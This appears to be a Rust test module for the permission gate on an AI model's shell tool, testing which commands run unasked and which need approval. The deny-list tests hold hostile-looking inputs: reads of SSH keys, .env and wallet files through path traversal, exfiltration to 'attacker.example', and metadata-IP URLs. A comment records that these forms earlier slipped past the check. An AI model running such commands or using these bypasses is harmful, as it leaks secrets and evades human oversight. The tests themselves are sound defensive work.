    fn what_only_looks_runs_without_asking() {
        for command in [
            "uname -a",
            "df -h",
            "du -sh /var/log",
            "du -d 1 -h .",
            "du --max-depth=2 /var",
            "lsblk -f",
            "free -m",
            "ls -la /var/log",
            "hostname -I",
            "date +%s",
            "date -u",
            "sysctl -n hw.ncpu",
            "sysctl vm.swapusage hw.memsize",
            "journalctl -u solv -o short-iso",
            "docker ps --filter status=running",
            "cat /etc/os-release",
            "cat /proc/cpuinfo /proc/meminfo",
            "curl -q -4 ifconfig.me",
            "curl -q -sS https://api.ipify.org/",
            "ip -br addr",
            "ip route get 1.1.1.1",
            "ip -6 addr show dev eth0",
            "ss -tulpn",
            "ss -s state established",
            "systemctl status nginx",
            "systemctl --no-pager status solv",
            "systemctl list-units --type=service --state=failed",
            "systemctl -n 50 status nginx",
            "journalctl -u solv -n 100 --no-pager",
            "journalctl -b -1 -p err",
            "journalctl --since=today -u nginx",
            "docker ps -a",
            "docker logs --tail 50 web",
            "docker stats --no-stream",
            "solana epoch-info",
            "solana -u m validators",
            "solana --url mainnet-beta balance",
            "solana --output json --commitment=finalized stakes",
            "solana account 11111111111111111111111111111111 --lamports",
            "git --version",
            "docker --version",
            "arch",
        ] {
            assert!(looks(command), "{command} should run without asking");
        }
    }

    #[test]
    fn anything_else_asks_first() {
        for command in [
            "rm -rf build",
            "sh -c ls",
            "sudo systemctl status nginx",
            "/bin/ls",
            "./uname",
            "hostname evil",
            "date -s 2020-01-01",
            "date 010100002020",
            "sysctl -w net.ipv4.ip_forward=1",
            "sysctl net.ipv4.ip_forward=1",
            "sysctl -p",
            "cat /home/user/.ssh/id_ed25519",
            "cat .env",
            "cat",
            "curl example.com",
            "curl ifconfig.me/../x",
            "curl -o out ifconfig.me",
            "curl ifconfig.me example.com",
            "curl -L ifconfig.me",
            "curl ifconfig.me@example.com",
            "curl ifconfig.me.example.com",
            "ip addr add 10.0.0.1/24 dev eth0",
            "ip a a 10.0.0.1/24 dev eth0",
            "ip link set eth0 down",
            "ip route flush all",
            "ip -batch cmds",
            "ip netns exec x sh",
            "ip addr show -x",
            "ss -K dst 1.2.3.4",
            "ss -tK",
            "ss -D out",
            "ss --kill",
            "systemctl restart nginx",
            "systemctl show nginx",
            "systemctl cat nginx",
            "systemctl -H host status",
            "systemctl -n status",
            "journalctl --vacuum-size=1M",
            "journalctl -n --vacuum-size=1M",
            "journalctl -f -u solv",
            "journalctl --rotate",
            "docker logs -f web",
            "docker logs -tf web",
            "docker stats",
            "docker inspect web",
            "docker run alpine",
            "docker -H tcp://x ps",
            "docker ps -H tcp://x",
            "docker ps --context=x",
            "arch -x86_64 rm -rf x",
            "solana transfer x 1",
            "solana config set --url m",
            "solana airdrop 1",
            "solana ping",
            "solana account x -o out.json",
            "solana account x --output-file=out.json",
            "solana -u transfer x 1",
            "solana",
            "env",
            "printenv",
            "ps aux",
            "git log",
            "git --version --exec-path=x",
            "timedatectl set-time 10:00",
        ] {
            assert!(!looks(command), "{command} should ask first");
        }
        assert!(!only_looks(&[]));
    }

    #[test]
    fn the_forms_that_slipped_past_a_list_of_refusals_ask_first() {
        // Each read a file, wrote one, reached a host of the model's
        // choosing or printed a secret before the list named what it
        // allows.
        for command in [
            "sysctl -n kernel/../../../root/.env",
            "sysctl kernel/../../../root/.config/solana/id.json",
            "sysctl -a",
            "sysctl",
            "sysctl ../x",
            "solana account x -oout.json",
            "solana account x -o=out.json",
            "solana -u attacker.example/leak?d=abc balance",
            "solana balance --url attacker.example/x",
            "solana --url=169.254.169.254 balance",
            "solana --ws attacker.example balance",
            "solana -k id.json balance",
            "solana -C other.yml balance",
            "solana config get",
            "solana -v balance",
            "solana -um balance",
            "solana -u",
            "curl ifconfig.me",
            "curl -4 -q ifconfig.me",
            "hostname -f",
            "hostname -i",
            "ss -r",
            "ss -tr",
            "ss --resolve",
            "systemctl status nginx -o verbose",
            "systemctl status nginx --output=json",
            "journalctl -o verbose",
            "journalctl --output=json -u solv",
            "journalctl -o",
            "docker ps --no-trunc",
            "docker ps --format {{.Command}}",
            "docker images --format=x",
            "cargo --version",
            "rustc --version",
            "node --version",
            "python3 --version",
            "du --files0-from=/root/.config/solana/id.json",
            "du --files0-from /root/.env",
            "du -X /root/.env .",
            "du -d x",
            "lscpu --sysroot=/root",
            "lscpu -s /root",
            "lsblk --sysroot /root",
            "sysctl net.ipv4.tcp_fastopen_key",
        ] {
            assert!(!looks(command), "{command} should ask first");
        }
    }

    #[test]
    fn a_command_is_shown_as_it_runs() {
        let argv =
            |items: &[&str]| -> Vec<String> { items.iter().map(|s| (*s).to_owned()).collect() };
        assert_eq!(shown(&argv(&["ls", "-la", "/tmp"])), "ls -la /tmp");
        assert_eq!(shown(&argv(&["echo", "a b", ""])), "echo 'a b' ''");
        assert_eq!(shown(&argv(&["echo", "it's"])), r"echo 'it'\''s'");
        let hidden = shown(&argv(&["rm", "a\u{202e}b\u{1b}[2J\u{200b}"]));
        assert_eq!(hidden, r"rm 'a\u{202e}b\u{1b}[2J\u{200b}'");
        let more = shown(&argv(&["x\u{2028}\u{ad}\u{e0041}\u{fe0f}"]));
        assert_eq!(more, r"'x\u{2028}\u{ad}\u{e0041}\u{fe0f}'");
        // A backslash written in the command is not shown the same as a
        // character that does not show.
        assert_ne!(shown(&argv(&["a\\u{1b}b"])), shown(&argv(&["a\u{1b}b"])));
        assert_eq!(shown(&argv(&["a\\b"])), r"'a\\b'");
        assert_ne!(super::shown_script("a\\nb"), super::shown_script("a\nb"));
        assert_eq!(super::shown_script("a\\nb\nc"), r"a\\nb\nc");
    }

    #[test]
    fn an_api_key_in_the_output_never_reaches_the_model() {
        assert_eq!(
            super::redacted("RPC URL: https://edge.erpc.global?api-key=SECRET-1 (x)\n"),
            "RPC URL: https://edge.erpc.global?api-key=REDACTED (x)\n"
        );
        assert_eq!(
            super::redacted("u?a=1&API_KEY=k2&b=2 apikey=k3"),
            "u?a=1&API_KEY=REDACTED&b=2 apikey=REDACTED"
        );
        assert_eq!(
            super::redacted("no key here, 日本語"),
            "no key here, 日本語"
        );
        assert_eq!(super::redacted("api-key="), "api-key=REDACTED");
        assert_eq!(
            super::redacted("x/?x-token=t1&access_token=t2"),
            "x/?x-token=REDACTED&access_token=REDACTED"
        );
    }

    #[test]
    fn the_input_is_a_list_of_strings() {
        assert!(super::argv(&json!({ "argv": ["ls"] })).is_ok());
        assert!(super::argv(&json!({ "argv": [] })).is_err());
        assert!(super::argv(&json!({ "argv": [""] })).is_err());
        assert!(super::argv(&json!({ "argv": ["ls", 1] })).is_err());
        assert!(super::argv(&json!({ "argv": "ls -la" })).is_err());
        assert!(super::argv(&json!({ "argv": ["ls", "a\u{0}b"] })).is_err());
        let many: Vec<String> = (0..65).map(|n| n.to_string()).collect();
        assert!(super::argv(&json!({ "argv": many })).is_err());
    }

    struct Fake {
        ran: core::cell::RefCell<Vec<Vec<String>>>,
    }

    /// A shell that runs nothing, keeps the limit each command was given,
    /// says a command builds or deploys when its second word is `deploy`,
    /// and keeps what it was asked that about.
    #[derive(Default)]
    struct Timed(
        core::cell::RefCell<Vec<core::time::Duration>>,
        core::cell::RefCell<Vec<Vec<String>>>,
    );

    impl super::Shell for Timed {
        fn folder(&self) -> String {
            "/work".to_owned()
        }

        fn run<'a>(
            &'a self,
            _: &'a [String],
            limit: core::time::Duration,
        ) -> super::Fut<'a, super::Ran> {
            self.0.borrow_mut().push(limit);
            Box::pin(async { Ok(super::Ran::default()) })
        }

        fn runs_long(&self, command: &[String]) -> bool {
            self.1.borrow_mut().push(command.to_vec());
            command.get(1).is_some_and(|word| word == "deploy")
        }
    }

    /// Says yes to everything it is asked.
    struct Yes;

    impl crate::confirm::Confirm for Yes {
        fn confirm<'a>(
            &'a self,
            _: &'a crate::confirm::Confirmation,
        ) -> core::pin::Pin<Box<dyn Future<Output = bool> + 'a>> {
            Box::pin(async { true })
        }
    }

    impl super::Shell for Fake {
        fn folder(&self) -> String {
            "/work".to_owned()
        }

        fn run<'a>(
            &'a self,
            argv: &'a [String],
            _: core::time::Duration,
        ) -> super::Fut<'a, super::Ran> {
            self.ran.borrow_mut().push(argv.to_vec());
            Box::pin(async {
                Ok(super::Ran {
                    status: Some(0),
                    stdout: "out".to_owned(),
                    ..super::Ran::default()
                })
            })
        }
    }

    struct Says(bool, core::cell::Cell<usize>);

    impl crate::confirm::Confirm for Says {
        fn confirm<'a>(
            &'a self,
            ask: &'a crate::confirm::Confirmation,
        ) -> core::pin::Pin<Box<dyn core::future::Future<Output = bool> + 'a>> {
            self.1.set(self.1.get() + 1);
            assert!(ask.text().contains("rm -rf build"), "{}", ask.text());
            assert!(ask.text().contains("/work"));
            let yes = self.0;
            Box::pin(async move { yes })
        }
    }

    #[tokio::test]
    async fn a_command_the_shell_calls_a_deploy_is_given_the_long_limit() {
        use super::{AGREED_LIMIT, DEPLOY_LIMIT, LOOK_LIMIT, run_command};
        // The limit is read where the command is run: through the tool,
        // with a person who says yes to whatever is asked.
        let given = async |input: serde_json::Value| {
            let shell = Timed::default();
            run_command(&input, Some(&Yes), Some(&shell), None)
                .await
                .expect("ran");
            let limits = shell.0.borrow();
            assert_eq!(limits.len(), 1, "run once");
            (limits[0], shell.1.borrow().clone())
        };
        let argv = |words: &[&str]| json!({ "argv": words });
        // What the shell says builds or deploys runs for the long limit,
        // and what it does not, for the one an agreed command has.
        let (limit, asked) = given(argv(&["tool", "deploy", "--now"])).await;
        assert_eq!(limit, DEPLOY_LIMIT);
        assert_eq!(asked, [["tool", "deploy", "--now"].map(str::to_owned)]);
        let (limit, _) = given(argv(&["tool", "status"])).await;
        assert_eq!(limit, AGREED_LIMIT);
        // A command that only looks keeps its own limit whatever the shell
        // would say: it runs without a yes, and is not asked about.
        let look = ["cat", "/etc/os-release"];
        assert!(super::only_looks(&look.map(str::to_owned)));
        let (limit, asked) = given(argv(&look)).await;
        assert_eq!(limit, LOOK_LIMIT);
        assert!(asked.is_empty(), "a look is not asked about: {asked:?}");
        // A script is not a command line the shell can read: it keeps the
        // agreed limit, and the shell is not asked about it.
        let (limit, asked) = given(json!({ "shell": "tool deploy && echo done" })).await;
        assert_eq!(limit, AGREED_LIMIT);
        assert!(asked.is_empty(), "a script is not asked about: {asked:?}");
        // A shell that says nothing (the trait's own answer) gives no
        // command the long limit.
        let plain = Fake {
            ran: core::cell::RefCell::default(),
        };
        assert!(!super::Shell::runs_long(
            &plain,
            &["tool", "deploy"].map(str::to_owned)
        ));
        assert!(DEPLOY_LIMIT > AGREED_LIMIT && AGREED_LIMIT > LOOK_LIMIT);
        // Long enough for the longest wait a deploy has of its own, which
        // the `erpc` crate holds it to.
        assert_eq!(DEPLOY_LIMIT, core::time::Duration::from_mins(90));
    }

    #[cfg(unix)]
    #[test]
    fn a_command_still_running_is_stopped_when_erpc_ends_without_destructors() {
        use std::os::unix::process::CommandExt as _;
        // A command in a process group of its own, as the shell starts one,
        // on the list of those running.
        let mut child = std::process::Command::new("sleep")
            .arg("60")
            .process_group(0)
            .spawn()
            .expect("sleep");
        let id = child.id();
        let group = super::Group::of(Some(id));
        let listed = || super::LIVE.lock().expect("list").contains(&id);
        assert!(listed());
        // What the signal's way out does, for this command alone: the other
        // tests' commands are on the same list.
        super::stop_where(|running| running == id);
        let status = child.wait().expect("ended");
        assert_eq!(status.code(), None, "killed, not ended by itself");
        assert!(!listed());
        drop(group);
        // One that ended by itself is off the list and is not killed.
        let mut child = std::process::Command::new("true")
            .process_group(0)
            .spawn()
            .expect("true");
        let mut group = super::Group::of(Some(child.id()));
        assert!(child.wait().expect("ended").success());
        assert_eq!(group.forget(), Some(child.id()));
        assert!(!super::LIVE.lock().expect("list").contains(&child.id()));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn the_shell_lists_a_command_while_it_runs_and_not_after() {
        use core::time::Duration;

        use super::Shell as _;
        let tmp = tempfile::tempdir().expect("tmp");
        // A command that says which process group it is, then runs on.
        let said = tmp.path().join("pid");
        let command: Vec<String> = [
            "sh",
            "-c",
            &format!("echo $$ > '{}'; exec sleep 30", said.display()),
        ]
        .map(str::to_owned)
        .to_vec();
        let shell = super::LocalShell;
        let running = shell.run(&command, Duration::from_secs(60));
        tokio::pin!(running);
        let id = loop {
            let read = std::fs::read_to_string(&said).ok();
            if let Some(id) = read.and_then(|text| text.trim().parse::<u32>().ok()) {
                break id;
            }
            let waited = tokio::time::timeout(Duration::from_millis(20), &mut running).await;
            assert!(waited.is_err(), "it ended before it said its id");
        };
        let listed = |id: u32| super::LIVE.lock().expect("list").contains(&id);
        assert!(listed(id), "on the list while it runs");
        // Stopped from the list, as the signal's way out does, this one
        // alone: the other tests' commands are on the same list.
        super::stop_where(|running| running == id);
        let ran = running.await.expect("ended");
        assert_eq!(ran.status, None, "killed, not ended by itself");
        assert!(!ran.timed_out);
        assert!(!listed(id));

        // One that ends by itself is off the list, so its id, which the
        // system gives to another process later, is never killed.
        let said = tmp.path().join("pid2");
        let command: Vec<String> = ["sh", "-c", &format!("echo $$ > '{}'", said.display())]
            .map(str::to_owned)
            .to_vec();
        let ran = shell
            .run(&command, Duration::from_secs(10))
            .await
            .expect("ran");
        assert_eq!(ran.status, Some(0));
        let id: u32 = std::fs::read_to_string(&said)
            .expect("its id")
            .trim()
            .parse()
            .expect("a number");
        assert!(!listed(id));
    }

    #[tokio::test]
    async fn only_a_command_that_looks_runs_without_a_yes() {
        let shell = Fake {
            ran: core::cell::RefCell::default(),
        };
        let look = json!({ "argv": ["df", "-h"] });
        let change = json!({ "argv": ["rm", "-rf", "build"] });
        let out = super::run_command(&look, None, Some(&shell), None).await;
        assert_eq!(out.expect("runs")["stdout"], "out");
        assert!(
            super::run_command(&change, None, Some(&shell), None)
                .await
                .is_err()
        );
        let no = Says(false, core::cell::Cell::new(0));
        assert!(
            super::run_command(&change, Some(&no), Some(&shell), None)
                .await
                .is_err()
        );
        assert_eq!(no.1.get(), 1);
        assert_eq!(shell.ran.borrow().len(), 1, "only df ran");
        let yes = Says(true, core::cell::Cell::new(0));
        let out = super::run_command(&change, Some(&yes), Some(&shell), None).await;
        assert_eq!(out.expect("runs")["command"], "rm -rf build");
        assert_eq!(shell.ran.borrow().len(), 2);
        let asked = Says(true, core::cell::Cell::new(0));
        assert!(
            super::run_command(&look, Some(&asked), Some(&shell), None)
                .await
                .is_ok()
        );
        assert_eq!(asked.1.get(), 0, "a look is never asked about");
        assert!(super::run_command(&look, None, None, None).await.is_err());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn the_local_shell_keeps_what_fits_and_stops_what_runs_too_long() {
        use super::{LocalShell, MAX_OUTPUT, Shell as _};
        use core::time::Duration;
        let argv =
            |items: &[&str]| -> Vec<String> { items.iter().map(|s| (*s).to_owned()).collect() };
        let ran = LocalShell
            .run(
                &argv(&["sh", "-c", "echo hi; echo oops >&2; exit 3"]),
                Duration::from_secs(10),
            )
            .await
            .expect("runs");
        assert_eq!(
            (ran.status, ran.stdout.as_str(), ran.stderr.as_str()),
            (Some(3), "hi\n", "oops\n")
        );
        assert!(!ran.truncated && !ran.timed_out);
        let ran = LocalShell
            .run(
                &argv(&["sh", "-c", "head -c 100000 /dev/zero"]),
                Duration::from_secs(10),
            )
            .await
            .expect("runs");
        assert_eq!(ran.stdout.len(), MAX_OUTPUT);
        assert!(ran.truncated);
        let ran = LocalShell
            .run(&argv(&["sleep", "5"]), Duration::from_millis(200))
            .await
            .expect("runs");
        assert!(ran.timed_out);
        assert_eq!(ran.status, None);
        // What it left running holds its output open: not waited for.
        let started = std::time::Instant::now();
        let ran = LocalShell
            .run(
                &argv(&["sh", "-c", "sleep 5 & echo left"]),
                Duration::from_secs(10),
            )
            .await
            .expect("runs");
        assert_eq!(ran.status, Some(0));
        assert!(
            started.elapsed() < Duration::from_secs(4),
            "{:?}",
            started.elapsed()
        );
        assert!(
            LocalShell
                .run(&argv(&["erpc-no-such-program"]), Duration::from_secs(1))
                .await
                .is_err()
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn what_a_command_started_is_stopped_with_it() {
        use super::{LocalShell, Shell as _};
        use core::time::Duration;
        let dir = tempfile::tempdir().expect("dir");
        let late = |name: &str| -> Vec<String> {
            let file = dir.path().join(name);
            vec![
                "sh".to_owned(),
                "-c".to_owned(),
                format!("sh -c 'sleep 1; echo late > {}'; true", file.display()),
            ]
        };
        // At the deadline.
        let ran = LocalShell
            .run(&late("deadline"), Duration::from_millis(300))
            .await
            .expect("runs");
        assert!(ran.timed_out);
        // Dropped part way, as Ctrl-C drops it.
        let dropped = late("dropped");
        let run = LocalShell.run(&dropped, Duration::from_secs(10));
        assert!(
            tokio::time::timeout(Duration::from_millis(300), run)
                .await
                .is_err()
        );
        tokio::time::sleep(Duration::from_millis(1500)).await;
        assert!(
            !dir.path().join("deadline").exists(),
            "the deadline left it running"
        );
        assert!(
            !dir.path().join("dropped").exists(),
            "dropping left it running"
        );
    }

    struct Always(core::cell::Cell<usize>);

    impl crate::confirm::Confirm for Always {
        fn confirm<'a>(
            &'a self,
            _: &'a crate::confirm::Confirmation,
        ) -> core::pin::Pin<Box<dyn core::future::Future<Output = bool> + 'a>> {
            unreachable!("run_command asks with allow")
        }

        fn allow<'a>(
            &'a self,
            ask: &'a crate::confirm::Confirmation,
        ) -> core::pin::Pin<Box<dyn core::future::Future<Output = super::Allow> + 'a>> {
            self.0.set(self.0.get() + 1);
            assert!(!ask.text().contains('\n') || ask.text().lines().count() == 3);
            Box::pin(async { super::Allow::Always })
        }
    }

    #[tokio::test]
    async fn a_command_allowed_once_is_not_asked_about_again_and_a_script_always_is() {
        let shell = Fake {
            ran: core::cell::RefCell::default(),
        };
        let allowed = super::Allowed::new();
        let always = Always(core::cell::Cell::new(0));
        let restart = json!({ "argv": ["systemctl", "restart", "solv"] });
        macro_rules! run {
            ($input:expr) => {
                super::run_command($input, Some(&always), Some(&shell), Some(&allowed))
            };
        }
        assert!(run!(&restart).await.is_ok());
        assert!(run!(&restart).await.is_ok());
        assert_eq!(always.0.get(), 1, "asked the first time only");
        // Another command, even close to it, is asked about.
        assert!(
            run!(&json!({ "argv": ["systemctl", "restart", "solv2"] }))
                .await
                .is_ok()
        );
        assert_eq!(always.0.get(), 2);
        // A script is asked about even when it only looks, and shown as
        // written.
        let script = json!({ "shell": "df -h | grep /dev\nuptime" });
        let out = run!(&script).await.expect("runs");
        assert_eq!(out["command"], "df -h | grep /dev\\nuptime");
        assert_eq!(always.0.get(), 3);
        assert!(run!(&script).await.is_ok());
        assert_eq!(
            always.0.get(),
            3,
            "the same script, word for word, is not asked again"
        );
        assert!(run!(&json!({ "shell": "df -h | grep /dev" })).await.is_ok());
        assert_eq!(always.0.get(), 4, "another script is");
        let runner = if cfg!(windows) {
            ["cmd", "/C"]
        } else {
            ["sh", "-c"]
        };
        assert_eq!(
            shell.ran.borrow().last().map(|argv| argv[..2].to_vec()),
            Some(runner.map(str::to_owned).to_vec())
        );
        // Without a session's list, an always is a yes this once.
        let once = Always(core::cell::Cell::new(0));
        for _ in 0..2 {
            super::run_command(&restart, Some(&once), Some(&shell), None)
                .await
                .expect("runs");
        }
        assert_eq!(once.0.get(), 2);
        for bad in [
            json!({ "argv": ["ls"], "shell": "ls" }),
            json!({}),
            json!({ "shell": "  " }),
            json!({ "shell": 1 }),
        ] {
            assert!(super::asked(&bad).is_err(), "{bad}");
        }
    }

    /// Answers every command, and `sure` to the question that makes sure.
    struct Everything(core::cell::Cell<usize>, bool);

    impl crate::confirm::Confirm for Everything {
        fn confirm<'a>(
            &'a self,
            ask: &'a crate::confirm::Confirmation,
        ) -> core::pin::Pin<Box<dyn core::future::Future<Output = bool> + 'a>> {
            assert!(ask.title.starts_with("Allow every command"));
            let sure = self.1;
            Box::pin(async move { sure })
        }

        fn allow<'a>(
            &'a self,
            _: &'a crate::confirm::Confirmation,
        ) -> core::pin::Pin<Box<dyn core::future::Future<Output = super::Allow> + 'a>> {
            self.0.set(self.0.get() + 1);
            Box::pin(async { super::Allow::Everything })
        }
    }

    #[tokio::test]
    async fn every_command_allowed_once_runs_scripts_too_without_asking() {
        let shell = Fake {
            ran: core::cell::RefCell::default(),
        };
        let allowed = super::Allowed::new();
        let everything = Everything(core::cell::Cell::new(0), true);
        let inputs = [
            json!({ "argv": ["systemctl", "restart", "solv"] }),
            json!({ "argv": ["erpc", "worker", "key", "new"] }),
            json!({ "shell": "cd /tmp && ls" }),
        ];
        for input in &inputs {
            super::run_command(input, Some(&everything), Some(&shell), Some(&allowed))
                .await
                .expect("runs");
        }
        assert_eq!(everything.0.get(), 1, "asked the first time only");
        assert_eq!(shell.ran.borrow().len(), 3);
        // Cleared with the conversation: asked again.
        allowed.clear();
        super::run_command(&inputs[0], Some(&everything), Some(&shell), Some(&allowed))
            .await
            .expect("runs");
        assert_eq!(everything.0.get(), 2);
    }

    #[tokio::test]
    async fn every_command_not_made_sure_of_runs_nothing_and_with_nowhere_to_keep_it_is_this_once()
    {
        let shell = Fake {
            ran: core::cell::RefCell::default(),
        };
        let restart = json!({ "argv": ["systemctl", "restart", "solv"] });
        // A no to the second question: nothing runs, and the next asks.
        let allowed = super::Allowed::new();
        let unsure = Everything(core::cell::Cell::new(0), false);
        for _ in 0..2 {
            let e = super::run_command(&restart, Some(&unsure), Some(&shell), Some(&allowed))
                .await
                .expect_err("not run");
            assert!(e.contains("not run"), "{e}");
        }
        assert_eq!(unsure.0.get(), 2);
        assert!(shell.ran.borrow().is_empty());
        // Nowhere to keep it: asked every time.
        let sure = Everything(core::cell::Cell::new(0), true);
        for _ in 0..2 {
            super::run_command(&restart, Some(&sure), Some(&shell), None)
                .await
                .expect("runs");
        }
        assert_eq!(sure.0.get(), 2);
        assert_eq!(shell.ran.borrow().len(), 2);
    }
}

#[cfg(test)]
mod erpc_looks_tests {
    use super::only_looks;

    fn looks(command: &str) -> bool {
        let argv: Vec<String> = command.split_whitespace().map(str::to_owned).collect();
        only_looks(&argv)
    }

    #[test]
    fn the_worker_verbs_that_only_look_run_without_asking() {
        for command in [
            "erpc worker check",
            "erpc worker check bot --json --lang ja",
            "erpc --json worker list",
            "erpc worker status --dir /apps/bot -e prod",
            "erpc worker logs -n 50 bot",
            "erpc worker logs --lines=200 --env prod",
            "erpc worker logs --waf -n 50 bot",
            "erpc worker releases bot",
            "erpc worker key show",
            "erpc worker key balance bot",
            "erpc worker secret list --dir bot",
            "erpc worker firewall list bot",
            "erpc worker backup status",
            "erpc worker --help",
            "erpc worker logs -h",
        ] {
            assert!(looks(command), "{command}");
        }
    }

    #[test]
    fn the_worker_verbs_that_change_buy_or_keep_running_ask() {
        for command in [
            "erpc worker logs -f bot",
            "erpc worker logs --follow",
            "erpc worker logs --waf -f bot",
            // Drops entries from the app index.
            "erpc worker list --prune",
            "erpc --json worker list --prune",
            "erpc worker deploy --new-vps",
            "erpc worker run bot",
            "erpc worker secret put API_TOKEN",
            "erpc worker key new",
            "erpc worker key import wallet.json",
            "erpc worker firewall allow 203.0.113.9",
            "erpc worker backup now",
            "erpc worker delete bot --release-server",
            "erpc worker status bot other",
            "erpc worker status --dir",
            "erpc login",
            "erpc ai -m hello",
        ] {
            assert!(!looks(command), "{command}");
        }
    }
}
